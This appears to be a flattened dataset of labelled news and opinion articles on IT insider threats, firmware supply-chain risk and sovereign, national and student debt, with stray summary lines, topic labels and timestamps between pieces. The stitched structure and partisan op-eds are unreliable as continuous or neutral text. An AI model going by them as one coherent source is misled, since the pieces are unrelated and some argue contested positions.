In an abstract written by Carl Colwill, he describes how information technology systems are well-defended from most outside hacks and traditional technological threats, but emphasizes how insider threats from employees are a very real threat for which most companies are unprepared. Interestingly, this assessment was also written in 2009, before the increased usage of social media by both government and the public en masse. This abstract, though dated, recognizes the problems posed by humans in the IT field.

More recently, others have acknowledged this and described how the IT field is a human process problem. According to Vircom, a Canadian tech company, “Human error is the leading cause of data and security breaches, responsible for 52% of such incidents. It was a person, lured by spear phishing, who opened the gates to the Democratic National Committee attack last year, as well as major hacks against Snapchat and the health care industry — to name a few examples of that human factor,” with Vircom’s Technical Support Director commenting, “The weakest chain in cyber security is the human being. It’s the lowest hanging fruit. Most of the attacks we see in the field right now are targeting uninformed people.”

Other examples of this human factor in the IT field comes in the form of the Equifax data breach, in which, “the company’s failure to perform the simple fix of patching the vulnerability,” resulted in 150 million having their data compromised or with the 2017 WannaCry ransomware attacks where, after the program was stolen from U.S. government servers and Microsoft issued a patch protecting against the malware, many simply did not install the new patch which resulted in massive corporate and companywide infections.

As one can see, human fallibility poses some significant problems to the IT space. As to how to solve this, I would argue that the best practice is take a national security approach in the vein of a CI structure. The entire point of counterintelligence is to prevent adversaries from gaining the upper hand by identifying, deceiving, exploiting, disrupting and protecting important information sectors, physical locations and documents that would threaten the security of the United States.

Taking a counterintelligence approach, which requires supervisors and all personnel to be on guard, having a stringent background vetting process with an emphasis on details, knowing the threats that are out in the world (both in a technological and non-tech sense), listening to both history and important analyses, and training people correctly are some of the techniques that many academics, experts, and other CI specialists would recommend could be utilized in the IT space and have extreme benefits in protecting sensitive information.

In terms of resilience, there are a number of ways to make the information technology sector resilient against various forms of attack.

First, education should be made the primary factor in promoting resilience in the IT sector. Many IT professionals either have work experience or military service, as opposed to undergraduate education in computer science or information technology. Because of this, while many are fluent in the technical constructs of IT and computation, a decent amount are not as fluent in the dangers that face cyberspace from foreign actors or the larger geopolitical problems that involve cyberspace.

Furthermore, like with most jobs, professionals can become complacent in the standard day-to-day operations and become lax in their duties. This lack of awareness can result in systems becoming compromised and penetrated by enemy actors, resulting in sensitive data being corrupted; items being stolen or deleted; and huge national security risks. It is apparent with the 2016 U.S. Presidential Election that relaxed security measures and general lethargy were the keys allowing Russia into the DNC’s servers. It could easily be argued that, on a company and corporate level, there should be steps taken to ensure that all members of the IT department are aware and fluent of larger geopolitical threats that are relevant to the field of cyberspace.

As well, joining forces with the federal government to have special agents and counterintelligence professionals brief the members of IT departments of large internet companies on current threats and potential risks the company faces on their servers and platforms would significantly help in promoting a joint private-public task force to combat disinformation and cyberattacks, while also allowing IT professionals to become more fluent in new and emerging threats that face the tech industry and the U.S. as a whole. This type of organization would be of great benefit in an anti-disinformation campaign (akin to what was seen with the Active Measures Working Group during the 1980s).",Cybersecurity Failure,2021-12-03 08:00:00

“Firmware updates present a major logistical challenge for many enterprises,” the agences said.","U.S. government warns that firmware presents “a large and ever-expanding attack surface.”

The U.S. government, at the very highest levels, is calling attention to major weaknesses in the firmware supply chain, warning that the layer below the operating system is fertile ground for devastating hacker attacks.

A new joint draft report issued by leadership of the U.S. Department of Homeland Security (DHS) and Department of Commerce said firmware presented “a large and ever-expanding attack surface” for malicious hackers to subvert the core of modern computing.

“Securing the firmware layer is often overlooked, but it is a single point of failure in devices and is one of the stealthiest methods in which an attacker can compromise devices at scale.”

“Attackers can subvert OS and hypervisor visibility and bypass most security systems, hide, and persist in networks and devices for extended periods of time while conducting attack operations, and inflict irrevocable damage,” the two agencies said following a one-year assessment of the supply chains for critical IT infrastructure deployed in the United States.

“Firmware can also be a lucrative target with a relatively low cost of attack. Over the past few years, hackers have increasingly targeted firmware to launch devastating attacks.”

The 96-page report (PDF), published to support the Biden Executive Order on securing America’s supply chains, warned that firmware’s privileged position in the computing stack gives stealthy attackers a major advantage.

[ READ: Microsoft: Firmware Attacks Outpacing Security Investments ]

Despite its essential role in electronic devices, the agencies insisted that firmware security “has not traditionally been a high priority for manufacturers or users and is not always well protected.”

During the assessment, the agencies found that firmware on items such as network cards, Wi-Fi adapters, and USB hubs are often not properly signed with public or private keys.

“These devices have no way to verify that the operating firmware is authentic and can be trusted.”

Even worse, the agencies called special attention to the fact that OEMs and computer makers outsource firmware development to third party suppliers. “[This] introduces risks related to the lack of transparency into suppliers’ programming and cybersecurity standards.”

[ READ: Prolific Chinese APT Caught Using 'MoonBounce' UEFI Firmware ]

The government’s warning comes as threat hunters spot signs that nation-state APT actors are using UEFI firmware implants to maintain stealthy infections and survive reboots and OS reinstallations. The notorious FinSpy surveillance spyware toolkit was also fitted with a bootkit to conduct stealthy infections.

In the report, the agencies also warned of “complex supply chains” that compound the problems securing firmware deployments.

“In PC production, for example, the OEMs are typically responsible for firmware and the rest of the PC platform elements. However, many OEMs outsource firmware development to third-party suppliers where OEMs may not have visibility into their cybersecurity hygiene. Even if OEMs establish security standards, they may not be able to enforce supplier security protocols across a wide range of components and sub-suppliers,” the government agencies warned.

The report also noted that individual OEM vendors may modify the firmware based on device needs once the firmware has been delivered to the OEM. “This can lead to confusion about what party is ultimately responsible for firmware integrity and who is to supply customer updates.”

[ READ: Dozens of UEFI Vulnerabilities Impact Millions of Devices From Major Vendors ]

“In addition, as devices and firmware change, OEMs often contract with different firmware developers, which can lead to delays or a lack of any update when older devices require updating and the original developer is not available. All of these factors can leave firmware open to malicious attacks,” the report said.

The agencies also called attention to the pain-point of applying firmware updates. “A firmware’s update process and capability vary by device. Some devices receive regular firmware updates. Some may only receive one update over their lifetimes, while others may never receive an update.”

Even worse, the process to install firmware updates is not simple, leading to skipped patches for critical-level vulnerabilities.

“Firmware updates present a major logistical challenge for many enterprises,” the agences said. “In many instances, device firmware is never updated or may only be updated in an emergency. In addition, vendors may only supply firmware updates if driven by an incident or identified vulnerability.”

The big picture: Countries like Sri Lanka loaded up on debt before and during COVID.

The bottom line: This round of debt crises, if it comes to pass, shouldn’t be as vast as, say, the Latin America debt crisis of the 1980s, when countries defaulted like dominos, Gulati says.","The south Asian island nation of Sri Lanka just defaulted on its debt. Its situation is not so different from a host of other lower-income nations — and there’s no reason to think others won’t share the same fate.

Why it matters: In a sovereign debt crisis, the biggest victims aren’t the international creditors — but the regular people whose economy is stuck in a holding pattern while the government haggles over austerity and repayment schedules.

And with global markets so closely intertwined, even small, seemingly containable crises can reverberate in unpredictable ways, says Jeremy Mark, senior fellow with think tank the Atlantic Council and a former International Monetary Fund (IMF) official.

The big picture: Countries like Sri Lanka loaded up on debt before and during COVID. Now, rising interest rates will make these debt loads more expensive — and chill growth that’s needed to help pay them off.

The war in Ukraine has made the already-precarious financial positions of many nations even worse, generating food and energy price shocks while interrupting trade and tourism.

Don’t forget government corruption (a factor not unique to Sri Lanka): “Some observers argue Sri Lanka’s debt crisis is the product of the hubris, mismanagement and alleged venality of political elites including the Rajapaksa family,” as the FT puts it.

What they're saying: “The question a lot of people have is: Is this just the beginning of defaults?” notes Mark.

“We're already seeing a slow moving crisis affecting some weaker countries. And there's nothing to say that this can’t widen, especially if we have a recession in the U.S.,"" Martin Muhleisen, formerly an IMF director, tells Axios.

State of play: The IMF estimates that about 60% of low-income countries are either in debt distress or at high risk of it — that figure has doubled since 2015.

A few examples include Pakistan, Ghana, Lebanon — and of course, Ukraine.

The impact: Besides a defaulter's inability to borrow from global markets, internal ripple effects from a default can further destroy that country's economy.

For instance, domestic banks usually have high lending exposure to their own government — so losses there can in turn curb lending to companies and households. That crimps growth, which further shrinks government finances.

In lending lingo, this is called a ‘doom loop.’

How it works: When a country is no longer able to make debt payments, it seeks rescue funds from the IMF while negotiating a debt restructuring deal with its creditors.

Typically, creditors take some losses while the country’s government agrees to abide by spending and budget constraints to get back in the market's good graces. These deals can take months, or even years, to hammer out.

But, but, but: China is the new wild card in these negotiations. It's morphed into a lending heavyweight to lower-income countries, recently overtaking Western institutions in lending to this group, according to World Bank data.

So far, China hasn't really been playing ball in restructuring negotiations, as Mark recently wrote about.

Just look at Zambia — it defaulted back in 2020, and China has been blamed for the lack of progress in talks.

Chinese banks are pretty green in the world of sovereign debt negotiations. They appear resistant to the fundamental linchpin of the process: forgiving some of what they're owed, says Mitu Gulati, a law professor at the University of Virginia who focuses on sovereign debt restructuring.

The bottom line: This round of debt crises, if it comes to pass, shouldn’t be as vast as, say, the Latin America debt crisis of the 1980s, when countries defaulted like dominos, Gulati says. That go-round was spurred by rates that rose far more rapidly than they’re expected to now.",Debt Crisis,2022-05-27 07:00:00

At the conclusion of WWII, fiscal conservatives were aghast that our national debt had ballooned to $259 billion. By the end of the Vietnam war it stood at $533 billion and, despite urgent warnings, was over $5,674 billion by the end of the century. Today it stands at $30,000 billion ($30 trillion) after the Biden administration’s horrific spending spree conducted on the pretext of limiting the fallout from Covid.

The reason is pretty simple. Spending other peoples’ money is politically popular. Taxes are not and budget cutting is risky.

We have developed a political culture in which the reelection of incumbents is the highest of all priorities. It is considered perfectly acceptable to just kick the can down the road and let future generations sort out the consequences of our selfishness.

So, for example, when Bush 43 attempted to propose desperately needed reforms for Medicare and Medicare, he was mercilessly demagogued for “pushing granny over the cliff.” His Republican allies deserted him and the effort collapsed. Nobody has tried any such thing since, although debt reduction is mathematically impossible without entitlement reform.

It doesn’t take a genius to see where this is going. Interest rates are rising, while serious geopolitical threats are forming. We’re backing ourselves into a position of severe internal and external weakness at just the wrong time.

Yet the political class remains unmoved. Some pay lip service to fiscal discipline, but the spending goes on unabated. Student loans, accommodations for illegal immigrants, and missiles for Ukraine on the condition that no Russians will be harmed by their use are all embraced as if unlimited funds are available.

Fortunately, our forefathers anticipated that the government they created would attempt to exceed its limited constitutional powers. They gave the states a powerful tool to defend themselves — the right to amend the constitution on their own.

Article V of the constitution mandates that Congress “shall” call a constitutional convention when requested to do so by two-thirds of the states and that any amendments proposed, when ratified by 3/4 of the states, become “Part of this of this Constitution”.

The founders would be disappointed to know that the states have never exercised this extraordinary privilege. Thomas Jefferson, knowing how these things go, thought a convention of the states would be needed every generation or so to reign in federal government encroachments.

Instead, the states have stood meekly by as the federal government has far surpassed them in power and prestige to the point where calling a convention of the states is seen as an act of rebellion against authority.

But nothing else has worked to restrain federal spending. Millions of dollars have been spent to elect self-described fiscal conservatives, yet it’s beyond obvious that Congress will never reform itself.

Of course, the convention-of-the-states idea has its enemies. Opposition from the spenders on the left is understandable because they don’t want to end their gravy train. But it is the alliance between the left and conservative stalwarts like the Eagle Forum and John Birch Society which have effectively stalled progress.

Their arguments are fear-inspired. Their principle objection is the perceived threat of a “runaway convention,” the fear that in a constitutional convention, there would be nothing to stop special interest groups from pushing their agendas from banning abortion to banning guns.

Hogwash. Even if the state legislatures fail to limit the authority of Convention delegates, 38 states must ratify any proposed amendments. That historically has been a very strong protection.

Right-wing opposition seems mostly concerned that the convention could inflict lasting damage to the sanctity of our Constitution. The opposite is the truth.

Nothing could honor and strengthen the constitution more than using its own provisions to enable us to address our most urgent modern threat. The other option is the Left’s practice of declaring a “living” constitution that says whatever judges say it does.

It’s time for us to flex our democratic muscles and fulfill our destiny as free, optimistic, and proud Americans. Our republic may be in the balance.

Now, the Federal Reserve has quietly turned to inflation to lighten the nation’s debt burden through a policy of negative real interest rates.

Unfortunately, this policy path is reducing the value of Americans’ paychecks and savings accounts as devaluation is used to effectively default on obligations incurred over decades. While it is clear how decades of deficit spending, rising entitlement costs, off-the-books war spending, and massive stimulus packages got America into this situation, a new data project from Reason Foundation reveals the true depths of this debt crisis.

The Debtor Nation visualization traces the growth of federal spending back to 1965, when Congress passed Medicare and Medicaid, helping fuel the explosion in health care costs thereby contributing significantly to the current $30 trillion national debt. From the creation of those entitlement programs the federal government ran an annual budget deficit in 52 of the 57 years between 1965 and 2022.

But beyond the debt figure typically used, Reason Foundation’s analysis of the latest federal financial report published by the U.S. Department of the Treasury in February finds that federal liabilities, when including obligations from entitlement programs, exceed $100 trillion. Unfunded future Medicare obligations account for almost 47 percent of that total.

The official federal balance sheet excludes Social Security and Medicare obligations, even though these benefits — accrued and anticipated by American workers not employed by the federal government — have similar legal status to the retirement benefits accrued and expected by federal civilian employees and veterans. Proper accrual accounting, which is the approach used both by corporations and state governments, requires liabilities to be recognized when they are assumed. The federal government took on obligations for Social Security in 1935 and Medicare in 1965, so it is past time to recognize these liabilities when reporting the national debt.

To its credit, the U.S. Treasury provides these ‘off balance sheet’ liabilities in a separate Statement of Social Insurance. Placing these liabilities on the federal balance sheet where they belong yields a total debt burden of $103 trillion as of the end of the 2021 fiscal year, which was 446 percent of America’s gross domestic product (GDP).

Much of this debt is now coming due as a large cohort of Baby Boomers retire and become eligible for Social Security and Medicare benefits. Baby Boomers began reaching early retirement age in 2008, and the last Boomer will reach full retirement age in 2031. In the 2030s and ‘40s, the annual trillion-dollar budget deficits needed to pay for these benefits will take America’s debt and deficits to largely uncharted territory.

The Congressional Budget Office’s own projections show that just making interest payments on the 2051 federal debt will exceed all the federal government’s tax revenues by 46 percent, crowding out discretionary spending. Those projections are highly sensitive to the future path of interest rates, a factor partially controlled by the Federal Reserve as recent interest rate hikes have illustrated.

The Federal Reserve holds down federal borrowing costs by purchasing more federal debt securities, typically with newly created reserves. By competing with other buyers of U.S. Treasury securities, it can push down interest rates. The Federal Reserve typically remits most of the interest income it receives on its bonds back to the U.S. Treasury, further lowering the government’s effective borrowing costs. There’s a possibility that the Fed may need to step in more and more in the future if foreign demand for U.S. debt securities decreases.

The two biggest foreign buyers of U.S. Treasury securities are China and Japan. China’s holdings of U.S. debt have declined $1.25 trillion in 2015 to $1.07 trillion in 2021 amidst deteriorating relations. In the worst-case scenario for the U.S., Chinese bondholders may need to liquidate more while dealing with fallout from their lockdowns and the collapse in domestic home prices while Japan’s holdings could stop growing or even shrink as that country grapples with economic issues related to its own aging population’s decline.

In that case, to hold down federal borrowing costs and interest rates, the Federal Reserve would seek to buy more U.S. Treasury securities, pumping more money into the economy, risking more inflation and elevating prices. This would devalue the existing debt and hold down the debt-to-GDP ratio while causing pain for Americans relying on a nest egg of dollar-denominated assets or receiving fixed-income payments. Cost-of-living increases may protect Social Security recipients from the worst ravages of inflation, but they would further drive up federal spending and deficits and increase calls for the Fed to print more money, which would trap Americans in this inflationary loop.

The massive federal debt accumulation is going to force extremely tough political and policy choices in the coming decades, but political leaders should stop the bleeding and start to contain the damage by adopting a more prudent approach to federal spending.

The federal budget process should be overhauled so that all forms of federal spending, including entitlements, are included in the budget process. Federal budgeting should rely on the accrual basis of accounting, forcing elected officials to internalize the long-term impact of entitlement programs and spending proposals. The size of annual deficits should be strictly capped. Given the looming debt and interest payment problems, if the budget can’t be balanced in the short-term, the deficits should be capped to prevent the growth of the debt-to-GDP ratio.

Since 1965, Congress has pushed tens of trillions of debt onto future generations. The subsidization of Baby Boomers is going to cripple young people and the country if political leaders don’t start to confront these long-term fiscal issues.

This is important because, while the United States is not a large creditor of Sri Lanka, America’s friend and security partner Japan currently holds 10 percent of Sri Lanka’s debt obligations.","The lesson of the Russo-Ukrainian War is that the world badly needs American leadership in this era of global turmoil and great power rivalry. By contributing billions of dollars worth of military hardware and humanitarian assistance, the United States has been Ukraine’s bulwark in preventing a Russian occupation of Kyiv, preserving the bedrock of the international world order that America’s “Greatest Generation” struggled to create amidst the ashes of World War II.

While war still rages, the United States may have to export that lesson to a different part of the globe, flexing its foreign policy muscles to assist another nation critical to our security interests.

In Sri Lanka, the scene is one of complete misery. Years of economic mismanagement by the ruling Rajapaksa family has depleted the country of its foreign currency reserves and created staggering inflation. Lines in the national capital of Colombo stretch for miles with people scrapping for the remaining quantities of food and kerosene cooking oil. Violent protests have become a regular feature outside the president’s house, and without significant foreign assistance and imports of critical supplies like food, gas, and medicine, it is likely that most Sri Lankans will suffer, and many will die.

In Sri Lanka, as in Ukraine, the United States has a chance to reassert its role as the leader of a rules-based international order, and provide a virtuous alternative to the revisionist machinations of autocratic societies like Russia and China.

Sri Lanka, like many other developing countries in the Asia-Pacific, has been a victim of Chinese predatory lending as a part of Xi Jinping’s Belt and Road Initiative (BRI), seeking to expand China’s influence by becoming a friendly creditor for the global south. Over the past decade, Sri Lanka has accumulated over $11 billion in debt from this BRI, largely on unprofitable “white elephant” projects with little upside—most notably the Hambantota Port in the country’s south, which was leased to a Chinese conglomerate for ninety-nine years due to the Sri Lankan government’s inability to service its debt obligations. These loans, unlike those provided by Western governments and institutions, often have predatory repayment structures, with interest rates exceeding 4 percent (compared to around 1 percent from an Organization for Economic Co-operation and Development creditor) and repayment periods of only ten years (OECD creditors average twenty-eight years).

Now, with Sri Lanka in the midst of its worst economic crisis in seventy years, and foreign currency reserves totalling less than $50 million, the country has no choice but to default on all its foreign debt repayments. The government, led by President Gotabaya Rajapaksa of the powerful Rajapaksa family, has reached out to China for $2.5 billion in emergency assistance. Xi, in turn, replied with a curt “no, thank you,” and sent a measly $31 million as emergency humanitarian aid. China’s Ministry of Foreign Affairs has also rejected every request by the Sri Lankan government to restructure its debt obligations.

These are not the actions of a “friendly creditor,” but instead are the hallmark features of China’s “debt trap diplomacy.” With one eye towards its global image, the Chinese Communist Party is wary of making any concessions to the terms of its loans, for the precedent it would set with other developing countries seeking debt forgiveness. Chinese lenders are encircling Sri Lanka like vultures, waiting for the small island nation to crack under the pressure of its economic situation and consent to debt-to-equity swaps, where past loans would be converted into Chinese control of major infrastructure projects—much like the Hambantota Port fiasco. China is using these loans not to enrich the lives of Sri Lankans, but to turn a profit and to gain access to natural resources.

It is important for America to show that there are better options available. Unlike Chinese loans that prioritize profit, bridge loans and rapid aid from international financial institutions and bilateral partners are designed to prioritize the Sri Lankan people. The International Monetary Fund, headquartered in Washington and whose largest voting member is the United States, should expedite the use of funds from its Rapid Financing Instrument (RFI), which would cover short-term balance of payment issues and provide for necessary purchases. The IMF should also make available its larger Extended Fund Facility (EFF) to further aid humanitarian efforts and to ensure that needed structural reforms are implemented. In all, these funds could amount to $600 million in financial assistance, a large step towards completing the $6 billion shortfall needed to cover short-term debt obligations and replete foreign currency reserves.

Beyond the IMF, however, there is much more the United States can do to help the people of Sri Lanka. A starting point would be to reignite the Millennium Challenge Corporation’s (MCC) $480 million Compact with the government of Sri Lanka. The MCC’s Board of Directors approved these funds in April of 2019, but were rejected by the government of Sri Lanka over “sovereignty issues.” These funds would help to reduce poverty through economic growth, by improving transportation and providing secure land titles to Sri Lankan farmers. Displaying a willingness to restart this compact would signal to the Sri Lankan people that America stands ready to assist, and to be a force for good in the long-term improvement of Sri Lankan society.

Congress should also consider passing legislation to provide direct humanitarian assistance to the people of Sri Lanka. This could include direct aid channeled through the U.S. Agency for International Development (USAID), as well as language mandating the Treasury Department to secure debt relief for Sri Lanka—both debt owed to the United States and to its allies. This is important because, while the United States is not a large creditor of Sri Lanka, America’s friend and security partner Japan currently holds 10 percent of Sri Lanka’s debt obligations. Working with Japan to reduce this burden can go a long way to correcting Sri Lanka’s insolvency.

There is a lot at stake in resolving Sri Lanka’s debt crisis. The island nation is strategically located in the center of the Indian Ocean, and over 60,000 ships pass close to its territorial waters each year, accounting for over 24 percent of container traffic in the South Asian region. America and Japan, duly cooperating to create a Free and Open Indo-Pacific (FOIP) strategy, must consider the importance of a stable and economically prosperous Sri Lanka to its larger national security interests. Turning a cold shoulder now would only push the nation further towards China’s sphere of influence, and with it only more debt and despair. It is time for America to resume its role as a global superpower, reassured of its status as the greatest guarantor of peace on Earth, and it can begin by using the institutions it created to aid the people of Sri Lanka.

G-Sec yields jumped, with the 10-year benchmark yield closing at 7.60 per cent, up 8 basis points vis-a-vis the previous close, on fears that the US Fed will go for aggressive rate hikes due to high inflation.

Rising bond yields

Rising bond yields indicate that financial markets are not anticipating inflation to cool down in the US even though it touched a four-decade high last week. On Monday, as the US stock index futures of Dow Jones, S&P and Nasdaq went into a tailspin, it led to a global market fall. The Nasdaq index in the US is said to have entered a bear market since it is down 20 percent from its peak. The Sensex was down 1,456 points to close at 52846 and the Nifty fell by 427 points to close at 15774. Monday’s fall in global markets came after a 3 per cent decline in the US markets last Friday after the inflation numbers were reported.

“Uncertainty is the biggest enemy of markets and bond yields are front running them. There’s uncertainty over the success of inflation control measures by central banks, China’s Covid lockdown and the geopolitical scenario in the wake of Russian sanctions. Even if the war ends, sanctions on Russia will remain. Hence, charts show crude oil at $160 per barrel in the near future. If that happens, I see Nifty falling to 14200, “said Rohit Srivastava, chief strategist at India Charts.

10-year US Treasury yields touched 3.24 per cent, the highest since October 2018. The sell-off in European government bonds also gathered pace, and the yield on Germany’s two-year government debt rose to over 1 per cent for the first time in over a decade. Italian benchmark yields exploded to 4 per cent, threatening to blow into the sovereign debt crisis if immediate steps did not come from the central banks and government.

Rahul Arora, CEO, institutional equity at Nirmal Bang, holds a contra view to the current negative scenario. “There is too much pessimism. Corporate earnings drive the markets and they are robust. The RBI has indicated that inflation will cool down by the fourth quarter of 2022. India is just 18 months away from national elections, so a spike in government spending is expected, which will bring liquidity. Even if Nifty sees big gap down tomorrow and does not close near the days low levels, I will start buying. Stock prices have declined by 50-70 per cent and downside seems limited,” Arora said.

Currency market

In the currency market, INR hit an intraday low of 78.28. The RBI started selling dollars at this level. It intervened at various levels between 78.15 and 78.25 to rein in the depreciating trend in the rupee. Anindya Banerjee, VP, Currency Derivatives and Interest Rate Derivatives, Kotak Securities, noted that heavy RBI intervention is suspected, both in spot as well as forwards.

“Thanks to that alleged intervention, today the rupee is one of the strongest currencies in the world. Going forward, till the US Fed meeting on Wednesday, there could be significant upward pressure on USDINR.

Bloodbath in the G-Sec market

The yield of the 10-year benchmark G-Sec shot up 8 bps to close at 7.6036 per cent (7.5195 per cent), with its price declining 54 paise to close at ₹92.84 (₹93.38).

Marzban Irani, CIO-Fixed Income, said there was a bloodbath in the G-Sec market as the latest (May) US retail inflation reading was at a 40-year high, trigerring fears that the Fed may hike interest rates by 75 bps. He added that this could further widen the spread between US 10-year paper and Indian 10-year paper.

Irani said there are concerns on a couple of fronts—a depreciating rupee and the recent increase in minimum support price for some crops could have an inflationary effect.",Debt Crisis,2022-06-13 14:47:06

Several years ago, after spending most of my career as a financial regulator, I became president of a small liberal arts college. One of my goals in accepting that position was to pioneer ways to reduce students’ reliance on loans to pay for their education in light of the skyrocketing levels of student debt plaguing the nation. During my first week, I found myself in a very confusing conversation with our director of admissions.

He kept talking to me about the amount of “financial aid” provided to our students, as I kept asking him about the size of their debt load. After 15 minutes of talking past each other, I finally realized that in the world of higher education, student loans were called “financial aid.” And therein lies the root of the student debt problem. It highlights the critical need for a transparent, free public resource to show individuals what it means for them to borrow from the federal government.

Federal student loans, which account for 92% of the $1.6 trillion outstanding debt balance, have long been promoted or misunderstood as a gift from the government — a benefit to take full advantage of, not a contractual obligation that will impose a burden on the borrowers’ financial future. Though disclosures have improved in recent years, most information provided to students continues to focus on how much they can borrow, not how much they should borrow. And clearly, too many students are borrowing more than they can manage. Sadly, according to a recent paper by the Bipartisan Policy Center, 40% of recent graduates are unable to pay down their principal by at least one dollar within three years of graduation. Repayment rates are much worse for those who do not complete their degrees.

Fortunately, the nonpartisan Peter G. Peterson Foundation is trying to address this problem by launching Student Debt Smarter, a unique resource and affordability calculator that helps prospective college students better understand the amount of debt that will be affordable to them before making any decisions about borrowing.

Story continues

By providing four easy inputs — college, major, year of enrollment and post-graduation location — users can get a personalized assessment of the maximum amount they can comfortably borrow based on their projected income and living expenses. Young people do not need a “financial aid” offer in hand to use the calculator, nor do they need to answer invasive questions about their families’ wealth. They only need their ideas and aspirations for the future in terms of where they might go to school, what they might study, and where they might live when they graduate. They can analyze as many different scenarios as they like and see how changing the variables impacts the affordability calculation. The calculator is designed for students to use before they apply to college to help them evaluate prospective schools and majors, as well as the affordability of financial aid offers once they receive them. It provides much-needed simplicity and transparency in an overly complex college and career decision-making process.

The calculator is unique in that it uses the latest salary data from the College Scorecard and leverages economic outlook data from Moody’s Analytics to help forecast the impact economic conditions will have on graduates’ earnings and expenses. And it is entirely free to use. Importantly, Student Debt Smarter does NOT ask for personal information and will NOT sell users’ data to college marketing firms, as is the case with many other tools found on the internet.

Students are falling deeper and deeper into debt, with total debt growing from $642 billion in 2007 to $1.566 trillion in 2020. A universal “payment pause” on student debt payments, imposed two years ago in response to the COVID-19 pandemic, continues as policymakers grapple with the merits of loan forgiveness and other reforms. Whatever the outcome of those ongoing policy debates, we need to make sure future student borrowers do not eventually find themselves in the same financial straits as so many of today’s borrowers who endure the stress and uncertainty of owing far more than they can realistically expect to repay. The Student Debt Smarter calculator will help them navigate the system as it exists and avoid that fate.

As a former bank regulator, I have too often seen the trauma and heartache for individuals and families overburdened by debt obligations. As a former academic and college president, I have too often seen how students are encouraged to borrow to pay for college and then later struggle with loan repayment obligations they did not fully understand. Most college degrees lead to enhanced earnings and borrowing to pay for them can be smart — within reason. Unfortunately, for many borrowers, the financial benefits of their education have been more than offset by the decades-long repayment obligations that constrain their budgets and hinder their ability to save and build wealth.

There are many systemic challenges in higher education that need to be addressed, including cost, access, equity and skills-based learning. Student Debt Smarter is aimed at one facet by empowering individual borrowers to make smart choices in paying for college, so that they can keep more of their hard-earned money and enjoy greater financial opportunities and freedom in their post-graduate adult lives.",Debt Crisis,2022-06-10 18:38:52

New figures released today by anti-poverty campaigners Debt Justice show that countries in debt crisis are expected to spend less in 2023 than in 2019, despite the urgent need for public expenditure in response to surging food and fuel prices.[1]

Lower income countries with the highest debt payments have seen public spending drops of an average of 3% between 2023 and 2019.

Increased public spending on essential services and infrastructure is vital for responding to soaring food and energy prices, climate crisis and other national needs, but the lack of effective debt relief mechanisms is forcing countries in debt crisis to cut public spending in order to make debt payments.

The research by Debt Justice is being released today ahead of an inquiry by the UK Parliament’s International Development Select Committee into the debt crisis in low income countries.[2] The UK has significant power to make private lenders take part in debt relief as 90% of bonds of countries eligible for the G20’s debt relief scheme are governed by English law.[3]

Tess Woolfenden, Senior Policy Officer at Debt Justice said:

“Lower-income countries are being forced to prioritise debt payments over public spending on healthcare or access to food, right at a time when spending is so urgently needed. The UK must act to make private lenders take part in debt relief. Debt repayments to wealthy lenders should not take precedence over people’s needs in a time of multiple crises.”

Abu Bakarr Kamara, Coordinator at the Budget Advocacy Network in Sierra Leone said:

“With Ebola and Covid-19, Sierra Leone has faced two major health crises in recent years, which have collapsed the health sector and the economy. Yet debt payments are taking away resources that are vital for recovery. Cancelling Sierra Leone’s debt is one vital tool to help the Government increase its fiscal space to invest in the health sector in a transparent and accountable way.”

Debt Justice has used IMF data to calculate external government debt payments and public spending cuts for 41 countries where there is information.

The countries with highest debt payments of over 15% of government revenue faced a drop in public spending of 3% between 2019 and 2023, compared to an increase of 14% for the countries with the lowest debt payments.

The Covid-19 pandemic has significantly increased debt levels in the last 2 years. External debt payments are now at the highest level since 2001.[4] Rising US and global interest rates, rising food and energy prices and the global impacts of the Ukraine war could significantly exacerbate debt levels further.

The G20 created a new debt relief scheme at the end of 2020, called the Common Framework, but none of the countries which have applied for it have yet had any debt cancelled. Private creditors could make large profits from their loans to lower income countries if repaid in full.[5]

Faced with the prospect of an intensifying debt crisis in 2022, the IMF has called for faster action on debt relief by compelling private sector participation in the Common Framework. On 21 April 2022 IMF Managing Director Kristalina Georgieva said: “We also are pressing for some of the changes, legal changes that need to happen in New York, in London, to close loopholes for vulture funds and others to prevent debt resolution.” [6]

Case studies

Ghana, Malawi and Sierra Leone are three of the countries with high debt payments and stagnating or falling public spending. Ghana’s external debt payments are over 40% of government revenue. Between 2022 and 2025 57% of its debt payments are to private lenders, 21% to multilateral institutions and 12% to China. The IMF expects real public spending per person to be around the same level in 2023, 2024 and 2025 as 2019.

In Malawi, the IMF expects real public spending per person to be 0.5% less in 2023 than in 2019. Malawi’s debt payments have suddenly increased due to expensive commercial loans taken on during the pandemic to fund imports. The interest rates on the commercial loans could be as high as 15%.

Sierra Leone’s high debt burden was created during the Ebola crisis in 2014 and 2015 but has been added to with loans during the Covid pandemic. The debt crisis has led to mass public spending cuts. In 2023 the IMF expects real public spending per person to be 20% less than in 2015, and 4% less than in 2019. This low level of spending is then expected to be maintained until at least 2025. Between 2022 and 2025, 46% of Sierra Leone’s external debt payments are to the IMF, 35% to other multilateral institutions and 19% to other governments.",Debt Crisis,2022-06-13 08:30:49

The high sovereign debt levels of many developing countries, which have risen even further in recent years, poses the threat of a global sovereign debt crisis.
In 2020, the debt-to-GDP ratio of developing countries rose from an average of 57 per cent to 69 per cent.
So far, there is no fair and effective procedure for restructuring sovereign debt at the international level.
Last but not least, a sustainable solution that counteracts the risk of sovereign debt crisis in developing countries is simply morally imperative.","Sovereign debt levels of many developing countries are worryingly high. After the spring meeting of the International Monetary Fund (IMF) and the World Bank in April, Germany's Finance Minister Christian Lindner announced that Germany would provide additional funding for further loans. Beyond that, Germany should use its G7 presidency to specifically push for a sustainable mechanism to restructure sovereign debt - as agreed in the coalition agreement.

The high sovereign debt levels of many developing countries, which have risen even further in recent years, poses the threat of a global sovereign debt crisis. It is currently one of the greatest macroeconomic risks for developing countries. The reasons for this are manifold: large loans were taken out towards the end of the 2010s. In combating the consequences of the Covid pandemic, there was a resort to fiscal stabilisation. The G7 countries are currently pursuing a monetary policy that attempts to curb inflation. The Russian war of aggression in Ukraine further exacerbates the situation.

In 2020, the debt-to-GDP ratio of developing countries rose from an average of 57 per cent to 69 per cent.

In the wake of the covid pandemic, many countries' sources of income were massively reduced by disrupted supply chains, restricted tourism, capital flight and low remittances. In 2020, the debt-to-GDP ratio of developing countries rose from an average of 57 per cent to 69 per cent. A first payment default shows the extent: In autumn 2020, Zambia was no longer able to meet its debts.

